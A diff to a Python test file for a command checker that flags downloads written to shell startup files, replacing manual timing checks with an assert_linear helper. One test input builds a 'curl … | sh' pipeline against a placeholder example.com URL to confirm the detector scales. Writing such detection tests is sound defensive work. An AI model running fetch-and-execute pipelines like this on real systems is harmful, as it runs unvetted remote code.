@@ -1,10 +1,10 @@
 """A download written to a shell startup file is found whatever the spelling of the target.
 Mirrors packages/zn-gate/test/destructive_targets.test.js. Only fake example.com URLs and example paths; nothing is run."""
-import time
 
 import pytest
 
 from zn_gate.destructive import check_command
+from ._timing import assert_linear
 
 DL = "https://example.com/i.sh"
 RC = "https://example.com/env.sh"
@@ -78,13 +78,8 @@ def test_cd_in_a_pipeline_does_not_move_the_folder():
     ">a >b >c >d echo hi; ",
 ])
 def test_200kb_stays_linear(unit):
-    big = unit * ((200 * 1024 - 8) // len(unit))
-    t0 = time.process_time()
-    rule(big)
-    assert time.process_time() - t0 < 3.0
+    assert_linear(rule, lambda n: unit * (n // len(unit)), 200 * 1024 - 8)
 
 
 def test_many_redirects_stay_linear():
-    t0 = time.process_time()
-    rule(">x " * 60000 + f"curl {RC} | sh")
-    assert time.process_time() - t0 < 3.0
+    assert_linear(rule, lambda n: ">x " * n + f"curl {RC} | sh", 60000)
